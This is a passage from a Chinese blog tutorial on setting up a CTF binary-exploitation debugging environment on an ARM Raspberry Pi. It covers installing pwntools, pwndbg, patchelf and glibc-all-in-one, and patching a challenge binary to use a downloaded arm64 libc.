alt="新建ssh连接"></p><p>以这样的格式填写即可。</p><p>然后就可以开始链接我们的树莓派啦，当然你肯定会觉得这个窗口不是很好看，背景挺碍眼的，这里其实可以<strong>关闭背景</strong>，鼠标右击可以看到下面有设置背景图片</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100427076.png" alt="设置背景图片"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100719414.png" alt="配置配色字体以及关闭背景"></p><p>把启用图片的√打掉就好了，此时你还发现取消掉背景怎么还是蓝色的，别着急，看看这里还要配色栏，你有很多钟配色可以选择，最下面有字体大小选择，这样就可以选择合适的字体大小和配色啦（毕竟<em>皮肤和坐骑的搭配才是获胜的关键</em>，这样就可以舒舒服服的进行调试啦。</p><h1 id="pwn调试环境搭建"><a href="#pwn调试环境搭建" class="headerlink" title="pwn调试环境搭建"></a>pwn调试环境搭建</h1><p>接下来就可以正式开始我们的环境搭建了，这里才是痛苦的开始，在配置环境期间遇到了数不清的问题，这一部分仅供参考，实际安装的时候还是要记得多搜索，毕竟这里每个人遇到的情况都有可能不同。</p><h2 id="python2的pip安装和pwntools安装"><a href="#python2的pip安装和pwntools安装" class="headerlink" title="python2的pip安装和pwntools安装"></a>python2的pip安装和pwntools安装</h2><p>我们先来解决最困难的，也就是python2的pwntools安装，之前一直是直接使用pip连接并没有发现什么问题，但是这次却有些问题，不管怎么说先安装python2</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install python</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1</span><br></pre></td></tr></table></figure><p>这样就将python的默认为python2了，如下图</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717105912959.png" alt="python默认pthon2"></p><p>接下来是pip的安装，现在已经无法正常安装python2的pip了，只能采取一些其他的手法,先安装setup-tools，这里需要先安装打开zip文件的软件</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install unzip</span><br><span class="line">wget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip<span class="comment">#md5=74663b15117d9a2cc5295d76011e6fd1</span></span><br><span class="line">unzip setuptools-36.6.0.zip </span><br><span class="line"><span class="built_in">cd</span> setuptools-36.6.0</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>再安装pip</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure><p>查看pip版本<code>pip --version </code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113029446.png" alt="检查pip版本"></p><p>说明pip安装完成</p><p>接下来安装pwntools</p><p>安装pwntools之前还需要一些准备工作,</p><p>安装gcc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure><p>安装capstone</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install make </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/aquynh/capstone</span><br><span class="line"><span class="built_in">cd</span> capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>安装pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools</span><br><span class="line"><span class="built_in">cd</span> pwntools</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>验证一下pwntools可用</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113956081.png" alt="验证pwntools"></p><p>如果不出意外，这里pwntools就安装好了，<strong>不要尝试</strong>用pip安装，基本不可能安装成功的，如果有其他情况就多搜索吧，或者评论区问我，如果我知道怎么回事，会给你回复的。这里pwntools算是安装完成了如果有问题我还是推荐装python3的pwntools吧,可能哪一天python2就不能用了,不是吗,我在装32位arm的ubuntu环境的时候发现无论如何都搞不定,我已经绝望了,还是适应python3吧.</p><p>python3安装pwntools的话就简单多了</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">pip3 install --upgrade pwntools</span><br></pre></td></tr></table></figure><h2 id="pwndbg安装"><a href="#pwndbg安装" class="headerlink" title="pwndbg安装"></a>pwndbg安装</h2><p>使用下面命令来安装pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717121038336.png" alt="验证pwndbg安装"></p><p>这样就是安装成功啦</p><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>patchelf是我们用来改写文件ld和libc的这里推荐<em>patchelf_0.12</em></p><p><a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p><p>github地址在这里里面有详细的教学，这里就不赘述啦</p><p>按照官方教程来就好了</p><h2 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc all in one"></a>glibc all in one</h2><p>这里还需要glibc all in one，虽然glibc all in one的下的库是x86下的，但是这个可以帮助我们很好的管理gliibc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br></pre></td></tr></table></figure><p>使用上面语句进行下载</p><p>然后随便下载一个libc，形成文件夹</p><p>下载好后需要安装一个库,并形成文件夹</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chmod 777 -R glibc-all-in-one/</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line">sudo pip install requests </span><br><span class="line">./update_list</span><br><span class="line">./download 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure><p>这样基本就完成了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717131220453.png" alt="完成后的效果"></p><p>类似上图，然后删除debs和libc里的文件，这些都是x86下的，用不到的.</p><h1 id="如何更改libc并完成调试"><a href="#如何更改libc并完成调试" class="headerlink" title="如何更改libc并完成调试"></a>如何更改libc并完成调试</h1><h2 id="下载libc"><a href="#下载libc" class="headerlink" title="下载libc"></a>下载libc</h2><p>当什么的工作都完成了我们就可以开始调试啦，我们以一道题目为例</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717130021816.png" alt="例子"></p><p>一般附件会给我们四个文件，这里我们需要的只要libc-2.31.so和题目文件</p><p>先将libc放入我们的树莓派系统中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x libc-2.31.so</span><br><span class="line">./libc-2.31.so</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132511485.png" alt="查看libc版本"></p><p>这样我们就能找到对应的libc版本</p><p>在这个网站中我们可以找到不同架构的不同版本libc，只要<strong>更改最后的路径</strong>即可,需要什么版本搜索什么</p><p><a href="https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2">https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2</a></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132941579.png" alt="寻找libc"></p><p>点击上图的arm64</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133112289.png" alt="需要下载的包">下载如图所示的文件(其他版本也是这样格式)到这里*/home/<strong>yourneme</strong>/glibc-all-in-one/debs<em>，注意<strong>yourname</strong>是你主机的名字，可以直接<strong>拖动</strong>到Finallshell显示的该文件夹下，或者*<em>复制</em></em></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133330375.png" alt="下载路径"></p><p>路径如图</p><p>在glibc目录下运行下面命令（<strong>注意更改路径，将ubuntu换成你的名字</strong>）</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64</span><br><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6-dbg_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64/.debug</span><br></pre></td></tr></table></figure><p>这样libc就部署好了。</p><h2 id="使用patchelf改变ld和libc"><a href="#使用patchelf改变ld和libc" class="headerlink" title="使用patchelf改变ld和libc"></a>使用patchelf改变ld和libc</h2><p>这里提供一个脚本来帮助师傅们更改libc，脚本来源：<em><a href="https://bbs.pediy.com/thread-254868.htm">https://bbs.pediy.com/thread-254868.htm</a></em></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -x</span><br><span class="line">libc_path=<span class="variable">$1</span></span><br><span class="line">elf_path=<span class="variable">$2</span></span><br><span class="line">patchelf_bin_path=<span class="string">&quot;/home/ubuntu/patchelf/src/patchelf&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$&#123;libc_path&#125;</span>/ld-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$patchelf_bin_path</span> --set-interpreter <span class="variable">$libc_path</span>/ld-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$patchelf_bin_path</span> --replace-needed libc.so.6 <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> +x</span><br></pre></td></tr></table></figure><p>这里的*patchelf_bin_path=”/home/ubuntu/patchelf/src/patchelf”*路径需要师傅们自行更改为自己patchelf的路径，<strong>注意不是文件夹是文件夹里的文件</strong>。</p><p>将该脚本命名为chlibc.sh</p><p>添加可执行权限</p><p>使用该脚本</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./chlibc.sh /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64 channel </span><br></pre></td></tr></table></figure><p>第二个路径是你<strong>libc文件夹</strong>的位置，最后是你文件的位置，这样就实现了对文件的patch，改变了文件的ld和libc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134856774.png" alt="patch"></p><p>使用ldd验证一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134809674.png" alt="验证"></p><p>可以发现没有任何问题</p><h2 id="调试验证"><a href="#调试验证" class="headerlink" title="调试验证"></a>调试验证</h2><p>我们用gdb调试一下看看</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134953976.png" alt="heap可行"></p><p>这样完成调试，显示heap</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717135015786.png" alt="bins可行"></p><p>也可以正常显示bins，这样就完成了我们的环境搭建了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是我的第一篇博客啦，有写的有问题的地方还望各位师傅斧正。上面的操作基本可以实现在arm架构下的脚本写exp并调试，如果觉得自带的vim不够方便的话还可以使用远程编辑exp，这个会在日后更新的。这里是本人的一点拙见，希望我写的东西能对你有一丝丝的帮助，感谢每个观看该文章的师傅。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Armpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Arm </tag>
            
            <tag> Iot </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
